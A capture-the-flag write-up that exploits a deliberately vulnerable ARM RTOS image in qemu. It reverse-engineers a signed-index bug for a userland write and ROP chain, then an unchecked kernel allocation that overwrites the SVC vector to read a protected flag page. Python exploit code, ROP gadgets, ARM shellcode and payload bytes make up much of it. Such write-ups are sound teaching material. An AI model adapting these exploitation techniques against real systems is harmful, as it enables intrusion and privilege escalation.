# The challenge

For this challenge we receive a boot.bin image and a run.sh that runs it using qemu as follows:

```sh
#!/bin/sh

appline=$(head -c 1000 /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)"BkP{This is the flag.}"
qemu-system-arm -M versatilepb -cpu cortex-a15 -m 128M -nographic -kernel boot.bin -monitor /dev/null -append "$appline" 2>/dev/null
```

We are also told that we must read the flag from address 0x40000000. Based on this I assumed we need to at least run code inside the qemu, and perhaps within kernel mode in order to read the flag.

If we run the qemu image we get the following shell:

```sh
sfx@ubuntu:/mnt/hgfs/bkpctf/distrib$ ./run.sh
[0] BkP RTOS version 1.0
[user@main]$
Available Programs:
	run	- Run scheduled programs
	schedule	- Switch to scheduling mode
	clear	- Clear schedule
	exec	- Switch to direct execution mode
	help	- This help screen
	calc	- Simple calculator
	trader	- Trading platform
	library	- Manage your library
	echo	- Echo test
	exit	- Restart
[user@main]$
```

So it seems we are dealing with an RTOS that has a few possible tasks to run. The first thing I did was playing around in the shell, run a few of the programs, etc.

Next I went onto IDA, and loaded it at address 0x0 as an ARM Little Endian blob. After a bit I found out using gdb that the base address should be 0x10000, so I relocated it there.

# User-space tasks

So looking through the disassembly I identified the functions of the main shell by cross-referencing some of the strings. The main function after renaming and adding a few comments looks like this:

```C
void __noreturn task_shell()
{
  int sz; // r0@1
  int v1; // r3@1
  int v2; // r3@1
  int v3; // r1@1
  int v4; // r2@1
  int v5; // r3@1
  int v6; // r0@2
  int v7; // r3@2
  int v8; // r2@2
  void *v9; // r3@2
  int v10; // r3@2
  int v11; // r3@2
  int v12; // r1@2
  int v13; // r2@2
  int v14; // r3@2
  int v15; // r1@6
  int v16; // r2@6
  int v17; // r3@6
  int v18; // r1@12
  int v19; // r2@12
  int v20; // r3@12
  int v21; // r3@20
  int v22; // [sp+0h] [bp-88h]@2

  sz = strlen((int)"[user@main]$ ");
  syscall(1, (int)"[user@main]$ ", sz, v1);
  syscall(1, (int)"\n", 1, v2);                 // 1 == sys_write
  printmenu();
  syscall(6, v3, v4, v5);
  while ( 1 )
  {
    memset((int)&v22, 0, 0x80u);
    v6 = strlen((int)"[user@main]$ ");
    syscall(1, (int)"[user@main]$ ", v6, v7);
    do_read(&v22, 128, v8, v9);                 // sys_read
    syscall(1, (int)&v22, 128, v10);
    syscall(1, (int)"\n", 1, v11);
    if ( !strcmp(&v22, "exit") )
    {
      syscall(99, v12, v13, v14);
    }
    else if ( !strcmp(&v22, "help") )
    {
      printmenu();
    }
    else if ( !strcmp(&v22, "clear") )
    {
      syscall(6, v15, v16, v17);                // 6 == sys_clear ?
    }
    else if ( !strcmp(&v22, "schedule") )
    {
      kernel_alloc[0] = 1;
      printf("- schedule mode -\n");
    }
    else if ( !strcmp(&v22, "exec") )
    {
      kernel_alloc[0] = 0;
      printf("- exec mode -\n");
    }
    else if ( !strcmp(&v22, "run") )
    {
      syscall(5, v18, v19, v20);                // sys_run
    }
    else if ( !strcmp(&v22, "calc") )
    {
      syscall(3, (int)do_calc, 0x1804C, 0);     // 3 == launch task
    }
    else if ( !strcmp(&v22, "trader") )
    {
      syscall(3, (int)do_trader, 0x1487C, (int)&dword_41B38);
    }
    else if ( !strcmp(&v22, "library") )
    {
      syscall(3, (int)do_library, 0x101BC, (int)dword_55AE8);
    }
    else if ( !strcmp(&v22, "echo") )
    {
      syscall(3, (int)do_echo, 0xF04C, 0);
    }
    else
    {
      syscall(1, (int)"bkpsh: command not found!\n", 26, v21);
    }
  }
}
```
Note that some part is missing due to Hex-Rays optimizing code out because I mapped everything as ROM (and thus it assumes it's read-only). I was too lazy to fix it, but it is always good to keep in mind that Hex-Rays does use the segment attributes to decide upon optimizations and the like.

Anyway, back to the challenge. After identifying a few syscalls and other functions in the main task, I turned to the library task.

It turns out this task add/list/edit/delete books. This sounds like the classic heap exploitation challenge.

Looking into the different functions, I identified the following issue in the page edit functionality:

```C
page *__fastcall lib_edit_page(page *result)
{
  item *v1; // r4@1
  int pagenum; // r0@2
  int *v3; // r4@3
  page *page; // r6@3
  unsigned int v5; // r4@4
  _BYTE *v6; // r4@8
  int v7; // r0@8
  int v8; // [sp+0h] [bp-410h]@2

  v1 = (item *)result;
  if ( result )
  {
    puts((int)"Page #: ");
    read_0(&v8, 128);
    pagenum = parse_num((int)&v8);
    if ( v1->numpages < pagenum )               // signed compare!
    {
      result = (page *)printf_0("Page doesn't exist\n");
    }
    else
    {
      v3 = &v1->title + pagenum;
      page = (page *)v3[2];
      if ( page )
      {
        puts((int)"font: ");
        read_0(page->font, 48);
        puts((int)"content: ");
        read_0(&v8, 1024);
        v5 = strlen_0((int)&v8);
        if ( v5 <= strlen_0(page->content) )
        {
          v6 = (_BYTE *)page->content;
          v7 = strlen_0(page->content);
          result = (page *)read_0(v6, v7 - 1);
        }
        else
        {
          free(page->content);
          result = (page *)strdup_((int)&v8);
          page->content = (int)result;
        }
      }
      else
      {
        result = read_page();
        v3[2] = (int)result;
      }
    }
  }
  return result;
}
```

As you can see, a signed compare is used to determine if the page exists. This allows us to select a page BEFORE the actual book.

The page structure looks as follows:
```C
struct page {
  char *content;
  char font[48];
};
```

So if we can provide an index to points to data we control, we'll have an arbitrary page pointer. In turn, the following code allows us to corrupt memory:

```C
        puts((int)"font: ");
        read_0(page->font, 48);
        puts((int)"content: ");
        read_0(&v8, 1024);
        v5 = strlen_0((int)&v8);
        if ( v5 <= strlen_0(page->content) )
        {
          v6 = (_BYTE *)page->content;
          v7 = strlen_0(page->content);
          result = (page *)read_0(v6, v7 - 1);
        }

```

As long as the string we provide is shorter than the string at the pointer we control. 

I initially went for corrupting the library itself, and ended up with a pretty complicated way of overwriting code using a chain of fake structures. 

While writing this, I've simplified the approach to simply write once by creating a fake page. This is the relevant python code:

```python

menu()
x.sendline("library")

# Setup a fake page pointer within the title of our first book
# write_target points to a function epilogue.

list_help = 0x44009cc
read_shift_sp = 0x440064c

write_target = read_shift_sp
print "[*] Write target: ", hex(write_target)

fake_page_ptr = 0x06400818 + 12
title = "AAAABBBB" + p32(fake_page_ptr) + p32(write_target)
assert len(title) < 128
add(title.ljust(128,"X"), [])

font, content = "AAAA", "BBBB"

pause()
'''
This changes the function epilogue from:

ROM:00056AB8 84 D0 8D E2                 ADD             SP, SP, #0x84 ; Rd = Op1 + Op2
ROM:00056ABC 30 80 BD E8                 LDMFD           SP!, {R4,R5,PC} ; Load Block from Memory

to:

   0x440064c:   andeq   r0, r0, r0
   0x4400650:   ldmfd   sp!, {pc}

This way we get a nice buffer overflow :)
'''

edit_page(1, -292, (font, content), "\x00"*4)
```

So after running this, the read function will not restore the stack frame and directly pop PC from our buffer.

Next is to create a ROP chain to load arbitrary shellcode. This is what I used:

```
sc_size = 0x400
ropchain = [
    0x440f2a8 , # : pop {r0,  lr} ; bx lr
    0,          # this is to force r3 = 0 below, but also sys_read!
    0x440e7d0,  # pop {r1, r2, lr} ; mul r3, r2, r0 ; sub r1, r1, r3 ; bx lr
    list_help,  
    sc_size,      # read 0x400 bytes. Arbitrary number
    0x440000c, # svc #0 ; pop {r4, r5, r6, r7, r8, sb, sl, fp, ip, pc}
    0x41414141,  # r4
    0x41414141,  # r5
    0x41414141,  # r6
    0x41414141,  # r7
    0x41414141,  # r8
    0x41414141,  # sb
    0x41414141,  # sl
    0x41414141,  # fp
    0x41414141,  # ip
    list_help,  # pc = return into list_help
]

payload = "".join([p32(i) for i in ropchain])
assert len(ropchain) < 128

x.sendline(payload)

sc = open("sc.bin", "rb").read()
x.send(sc.ljust(sc_size, "\x00"))
```

As you can see, I decided to overwrite the list_help function with my shellcode and jump to it.

At this point, we have full arbitrary code execution in userspace, so it's time to look at the kernel itself.

# Kernel space bug

I did spend quite some time analyzing all system calls in the kernel, which is not too many:

* read     : Simply read from UART/stdin
* write    : Write to UART/stdout
* random   : Generate a random number
* exec     : execute a task
* schedule : schedule a task (add it to a list of tasks)
* run      : run all scheduled tasks
* clear    : clear scheduled task list
* exit     : exit task, i.e. run next scheduled task or go back to main shell.

During reversing, I also saw that the MMU was being initialized by setting TTBR0:

```C
void __fastcall setup_mmu(int a1, int a2, int a3, int a4)
{
  __mcr(15, 0, 0x2A00000u, 2, 0, 0);
  setup_pagetables((int *)0x2A00000);
  __mcr(15, 0, 1u, 3, 0, 0);
  __mcr(15, 0, __mrc(15, 0, 1, 0, 0) | 1, 1, 0, 0);
}
```

So instead of analyzing the routine to setup page tables I simply dumped them from memory using gdb and parsed them using a script (see mmu.py). Note I stopped after the last configured entry:

```
VA 0x00000000 -->  NO_PXN  SECT  PA 0x00000000 RW_PL1 
VA 0x00100000 -->  FAULT
VA 0x00200000 -->  FAULT
VA 0x00300000 -->  FAULT
VA 0x00400000 -->  FAULT
VA 0x00500000 -->  FAULT
VA 0x00600000 -->  FAULT
VA 0x00700000 -->  FAULT
VA 0x00800000 -->  FAULT
VA 0x00900000 -->  FAULT
VA 0x00a00000 -->  PXN SECT  PA 0x00a00000 RW_PL1  XN
VA 0x00b00000 -->  PXN SECT  PA 0x00b00000 RW_PL1  XN
VA 0x00c00000 -->  PXN SECT  PA 0x00c00000 RW_PL1  XN
VA 0x00d00000 -->  PXN SECT  PA 0x00d00000 RW_PL1  XN
VA 0x00e00000 -->  PXN SECT  PA 0x00e00000 RW_PL1  XN
VA 0x00f00000 -->  PXN SECT  PA 0x00f00000 RW_PL1  XN
VA 0x01000000 -->  PXN SECT  PA 0x01000000 RW_PL1  XN
VA 0x01100000 -->  PXN SECT  PA 0x01100000 RW_PL1  XN
VA 0x01200000 -->  PXN SECT  PA 0x01200000 RW_PL1  XN
VA 0x01300000 -->  PXN SECT  PA 0x01300000 RW_PL1  XN
VA 0x01400000 -->  PXN SECT  PA 0x01400000 RW_PL1  XN
VA 0x01500000 -->  PXN SECT  PA 0x01500000 RW_PL1  XN
VA 0x01600000 -->  PXN SECT  PA 0x01600000 RW_PL1  XN
VA 0x01700000 -->  PXN SECT  PA 0x01700000 RW_PL1  XN
VA 0x01800000 -->  PXN SECT  PA 0x01800000 RW_PL1  XN
VA 0x01900000 -->  PXN SECT  PA 0x01900000 RW_PL1  XN
VA 0x01a00000 -->  PXN SECT  PA 0x01a00000 RW_PL1  XN
VA 0x01b00000 -->  PXN SECT  PA 0x01b00000 RW_PL1  XN
VA 0x01c00000 -->  PXN SECT  PA 0x01c00000 RW_PL1  XN
VA 0x01d00000 -->  PXN SECT  PA 0x01d00000 RW_PL1  XN
VA 0x01e00000 -->  PXN SECT  PA 0x01e00000 RW_PL1  XN
VA 0x01f00000 -->  PXN SECT  PA 0x01f00000 RW_PL1  XN
VA 0x02000000 -->  PXN SECT  PA 0x02000000 RW_PL1  XN
VA 0x02100000 -->  PXN SECT  PA 0x02100000 RW_PL1  XN
VA 0x02200000 -->  PXN SECT  PA 0x02200000 RW_PL1  XN
VA 0x02300000 -->  PXN SECT  PA 0x02300000 RW_PL1  XN
VA 0x02400000 -->  PXN SECT  PA 0x02400000 RW_PL1  XN
VA 0x02500000 -->  PXN SECT  PA 0x02500000 RW_PL1  XN
VA 0x02600000 -->  PXN SECT  PA 0x02600000 RW_PL1  XN
VA 0x02700000 -->  PXN SECT  PA 0x02700000 RW_PL1  XN
VA 0x02800000 -->  FAULT
VA 0x02900000 -->  FAULT
VA 0x02a00000 -->  PXN SECT  PA 0x02a00000 RW_PL1  XN
VA 0x02b00000 -->  PXN SECT  PA 0x02b00000 RW_PL1  XN
VA 0x02c00000 -->  NO_PXN  SECT  PA 0x02c00000 RW_PL1 RO_PL0 
VA 0x02d00000 -->  NO_PXN  SECT  PA 0x02d00000 RW_PL1 RO_PL0 
VA 0x02e00000 -->  FAULT
VA 0x02f00000 -->  FAULT
VA 0x03000000 -->  PXN SECT  PA 0x03000000 RW_PL1  XN
VA 0x03100000 -->  PXN SECT  PA 0x03100000 RW_PL1  XN
VA 0x03200000 -->  PXN SECT  PA 0x03200000 RW_PL1  XN
VA 0x03300000 -->  PXN SECT  PA 0x03300000 RW_PL1  XN
VA 0x03400000 -->  PXN SECT  PA 0x03400000 RW_PL1  XN
VA 0x03500000 -->  PXN SECT  PA 0x03500000 RW_PL1  XN
VA 0x03600000 -->  PXN SECT  PA 0x03600000 RW_PL1  XN
VA 0x03700000 -->  PXN SECT  PA 0x03700000 RW_PL1  XN
VA 0x03800000 -->  PXN SECT  PA 0x03800000 RW_PL1  XN
VA 0x03900000 -->  PXN SECT  PA 0x03900000 RW_PL1  XN
VA 0x03a00000 -->  PXN SECT  PA 0x03a00000 RW_PL1  XN
VA 0x03b00000 -->  PXN SECT  PA 0x03b00000 RW_PL1  XN
VA 0x03c00000 -->  PXN SECT  PA 0x03c00000 RW_PL1  XN
VA 0x03d00000 -->  PXN SECT  PA 0x03d00000 RW_PL1  XN
VA 0x03e00000 -->  PXN SECT  PA 0x03e00000 RW_PL1  XN
VA 0x03f00000 -->  PXN SECT  PA 0x03f00000 RW_PL1  XN
VA 0x04000000 -->  PXN SECT  PA 0x04100000 RW_PL1  XN
VA 0x04100000 -->  PXN SECT  PA 0x04100000 RW_PL1  XN
VA 0x04200000 -->  PXN SECT  PA 0x04200000 RW_PL1  XN
VA 0x04300000 -->  PXN SECT  PA 0x04300000 RW_PL1  XN
VA 0x04400000 -->  PXN SECT  PA 0x04400000 RW 
VA 0x04500000 -->  PXN SECT  PA 0x04500000 RW 
VA 0x04600000 -->  PXN SECT  PA 0x04600000 RW 
VA 0x04700000 -->  PXN SECT  PA 0x04700000 RW 
VA 0x04800000 -->  PXN SECT  PA 0x04800000 RW 
VA 0x04900000 -->  PXN SECT  PA 0x04900000 RW 
VA 0x04a00000 -->  PXN SECT  PA 0x04a00000 RW 
VA 0x04b00000 -->  PXN SECT  PA 0x04b00000 RW 
VA 0x04c00000 -->  PXN SECT  PA 0x04c00000 RW 
VA 0x04d00000 -->  PXN SECT  PA 0x04d00000 RW 
VA 0x04e00000 -->  PXN SECT  PA 0x04e00000 RW 
VA 0x04f00000 -->  PXN SECT  PA 0x04f00000 RW 
VA 0x05000000 -->  PXN SECT  PA 0x05000000 RW 
VA 0x05100000 -->  PXN SECT  PA 0x05100000 RW 
VA 0x05200000 -->  PXN SECT  PA 0x05200000 RW 
VA 0x05300000 -->  PXN SECT  PA 0x05300000 RW 
VA 0x05400000 -->  PXN SECT  PA 0x05400000 RW 
VA 0x05500000 -->  PXN SECT  PA 0x05500000 RW 
VA 0x05600000 -->  PXN SECT  PA 0x05600000 RW 
VA 0x05700000 -->  PXN SECT  PA 0x05700000 RW 
VA 0x05800000 -->  PXN SECT  PA 0x05800000 RW 
VA 0x05900000 -->  PXN SECT  PA 0x05900000 RW 
VA 0x05a00000 -->  PXN SECT  PA 0x05a00000 RW 
VA 0x05b00000 -->  PXN SECT  PA 0x05b00000 RW 
VA 0x05c00000 -->  PXN SECT  PA 0x05c00000 RW 
VA 0x05d00000 -->  PXN SECT  PA 0x05d00000 RW 
VA 0x05e00000 -->  PXN SECT  PA 0x05e00000 RW 
VA 0x05f00000 -->  PXN SECT  PA 0x05f00000 RW 
VA 0x06000000 -->  PXN SECT  PA 0x06000000 RW 
VA 0x06100000 -->  PXN SECT  PA 0x06100000 RW 
VA 0x06200000 -->  PXN SECT  PA 0x06200000 RW 
VA 0x06300000 -->  PXN SECT  PA 0x06300000 RW 
VA 0x06400000 -->  PXN SECT  PA 0x06400000 RW  XN
VA 0x06500000 -->  PXN SECT  PA 0x06500000 RW  XN
VA 0x06600000 -->  PXN SECT  PA 0x06600000 RW  XN
VA 0x06700000 -->  PXN SECT  PA 0x06700000 RW  XN
VA 0x06800000 -->  PXN SECT  PA 0x06800000 RW  XN
VA 0x06900000 -->  PXN SECT  PA 0x06900000 RW  XN
VA 0x06a00000 -->  PXN SECT  PA 0x06a00000 RW  XN
VA 0x06b00000 -->  PXN SECT  PA 0x06b00000 RW  XN
VA 0x06c00000 -->  PXN SECT  PA 0x06c00000 RW 
VA 0x06d00000 -->  PXN SECT  PA 0x06d00000 RW 
VA 0x06e00000 -->  PXN SECT  PA 0x06e00000 RW 
VA 0x06f00000 -->  PXN SECT  PA 0x06f00000 RW 
VA 0x07000000 -->  PXN SECT  PA 0x07000000 RW 
VA 0x07100000 -->  PXN SECT  PA 0x07100000 RW 
VA 0x07200000 -->  PXN SECT  PA 0x07200000 RW 
VA 0x07300000 -->  PXN SECT  PA 0x07300000 RW 
VA 0x07400000 -->  PXN SECT  PA 0x07400000 RW 
VA 0x07500000 -->  PXN SECT  PA 0x07500000 RW 
VA 0x07600000 -->  PXN SECT  PA 0x07600000 RW 
VA 0x07700000 -->  PXN SECT  PA 0x07700000 RW 
VA 0x07800000 -->  PXN SECT  PA 0x07800000 RW  XN
VA 0x07900000 -->  PXN SECT  PA 0x07900000 RW  XN
VA 0x07a00000 -->  PXN SECT  PA 0x07a00000 RW  XN
VA 0x07b00000 -->  PXN SECT  PA 0x07b00000 RW  XN
VA 0x07c00000 -->  PXN SECT  PA 0x07c00000 RW  XN
VA 0x07d00000 -->  PXN SECT  PA 0x07d00000 RW  XN
VA 0x07e00000 -->  PXN SECT  PA 0x07e00000 RW  XN
VA 0x07f00000 -->  PXN SECT  PA 0x07f00000 RW  XN
VA 0x08000000 -->  FAULT
```

There are a few interesting things here:

* Kernel code is mapped as RWX.
* PXN seems to be used for userland processes.
* Between 0x02c00000 and 0x02e00000 there are 2MB of kernel data that are mapped RO for userspace.
* The remainder of userland memory is located between 0x04400000 and 0x08000000, as we already found out during the analysis of the userland task.
* The flag page does not seem to  be mapped in, so we'll have to do that ourselves.

As for the vulnerability, after not seeing it for a while I finally realized that the schedule syscall was not properly checking the result of kmalloc:

```C
signed int __fastcall sys_schedule(int task_name, unsigned int src, unsigned int size)
{
  signed int ret; // r3@2
  task_desc *task; // [sp+10h] [bp-14h]@18
  list_desc *task_list_desc; // [sp+18h] [bp-Ch]@18
  int kbuf1; // [sp+1Ch] [bp-8h]@16

  if ( !validate(task_name) )                   // check ptr 1, allows equality with upper range!
    return -1;
  if ( !validate(src) )                         // check ptr 2
    return -1;
  if ( !validate(src + size) )                  // validate end ptr2
    return -1;
  if ( src + size < src || src + size < size )  // verify overflows
    return -1;
  if ( size > 0x80000 )
    return -1;
  if ( (unsigned int)strlen_1(task_name) > 31 )
    return -1;
  if ( task_exists((char *)task_name) )
    return -1;
  kbuf1 = kernel_malloc(size);
  if ( !kbuf1 )
    return -1;
  memcpy(kbuf1, src, size);
  task = (task_desc *)kernel_malloc(0x28u);     // Unverified!!
  task->buffer = kbuf1;
  task->size = size;
  strcpy((unsigned int)task->name, task_name);
  task_list_desc = make_list_desc((int)task);
  if ( task_list_desc )
  {
    if ( task_list )
    {
      list_add_head(task_list_desc, task_list);
    }
    else
    {
      task_list = task_list_desc;
      list_add_head(task_list, 0);
      task_scheduled = 1;
    }
    ret = 0;
  }
  else
  {
    kfree(kbuf1);
    kfree((int)task);
    ret = -1;
  }
  return ret;
}
```

So if we can cause memory exhaustion, we will be able to write to NULL. In particular, the task name will be written to 0x8, which conveniently contains the SVC reset vector.

This is thus the plan of attack:

1. Almost exhaust all memory by using adding tasks to the schedule list. Note that we need a different task name each time, so I'm just calling the random() system call and using that as task name.
2. Add a final task for which the first kmalloc() will succeed, and the second one will fail. This task name will be written on top of the SVC handler.
3. Trigger an svc to execute our newly introduced code.

## Step 1: exhausting memory

For exhausting memory, I wrote a simple loop with a task of the maximum allowed size:

```asm
.text
.globl start
start:

        ldr r9, =#59

        sub sp, sp, #0x400
        mov r11, sp

loop:

        bl rand
        str r0, [sp]
        eor r0, r0
        str r0, [sp, #4]

        mov r1, sp
        ldr r2, =#0x04400000
        ldr r3, =#0x7f000
        bl sched

        cmp r0, #0x0
        moveq r3, #79
        movne r3, #78

        str r3, [sp]
        mov r3, #0x0A
        str r3, [sp, #0x01]

        mov r1, sp
        mov r2, #0x2
        bl write


        sub r9, r9, #0x1
        cmp r9, #0
        bne loop
        
lastone:
        bl rand
        str r0, [sp]
        eor r0, r0
        str r0, [sp, #4]

        mov r1, sp
        ldr r2, =#0x04400000
        ldr r3, =#0x6dfe0
        bl sched
```

At each step of the loop we are actually writing O (for OK) or N (for  Not OK) depending on the syscall result. I used this initially to determine how many iterations of the loop I needed.

After this, I decided to read in the task name from the exploit and trigger the final schedule call:

```asm
done:
        @ Signal Done to get our new instructions         
        mov r3, #68
        str r3, [sp]
        mov r3, #0x0A
        str r3, [sp, #0x01]
        mov r1, sp
        mov r2, #0x2
        bl write

        @ Read instructions to put at 0x8
        mov r1, sp
        mov r2, #0x10
        bl read


        mov r1, sp
        ldr r2, =#0x04400000
        ldr r3, =#0x4bb00
        bl sched
```

After this point, our rewritten SVC handler would be ready to execute. I decided to replace it by the following code:

```asm
str	r7, [r8, #4]
ldr	pc, [pc, #20]	; 0x28
```

This effectively gives us an arbitrary write using r7 and r8, and then calls the original syscall handler. I used this to change an L1 page table descriptor to be able to read the flag, and then dump it using the write syscall:

```asm
        @Invalid syscall should result in a write to memory
        ldr r7, =#0x04000c03
        ldr r8, =#0x2a00140
        sub r8, r8, #0x4
        
        ldr r1, =#0x05000000
        mov r2, #0x20
        bl write


end:
        bl rand
        b end
```

We then assemble the shellcode and extract the binary:

```
arm-none-eabi-as ./boot_sc.s && arm-none-eabi-objcopy -O binary a.out sc.bin
```

The following few lines were added to the python exploit to send the shellcode and later the kernel payload:

```python

sc = open("sc.bin", "rb").read()
x.send(sc.ljust(sc_size, "\x00"))

print "[*] Waiting for Done flag"
x.recvuntil("D\n")

print "[*] Sending kernel mode payload"

'''
This is the following code:

str r7, [r8, 4]
ldr pc, [pc, 20] 

to replace the syscall reset vector.

This way we get an arbitrary write for each syscall we make
'''
sc = "047088e514f09fe5".decode("hex")
x.send(sc.ljust(16, "\x00"))

print "[*] Go check!"

x.interactive()
```

# Show time

Finally, running this on the CTF server we got the following output:

```
bkpctf python bare.py
[+] Opening connection to 54.214.122.246 on port 8888: Done
[*] Write target: 0x440064c
[*] Paused (press any to continue)
[*] Waiting for Done flag
[*] Sending kernel mode payload
[*] Go check!
[*] Switching to interactive mode
BkP{I saw ARM on your resume...}[*] Got EOF while reading in interactive
$
```

And this concludes this very nice multi-stage exploiting challenge :)

If you are curoius and want to try it out locally, just get the files from the challenge folder and run the server with socat as follows:

```
socat TCP-LISTEN:8888,reuseaddr,fork EXEC:"./run.sh"
```

Replace the IP address in the python file and run it.

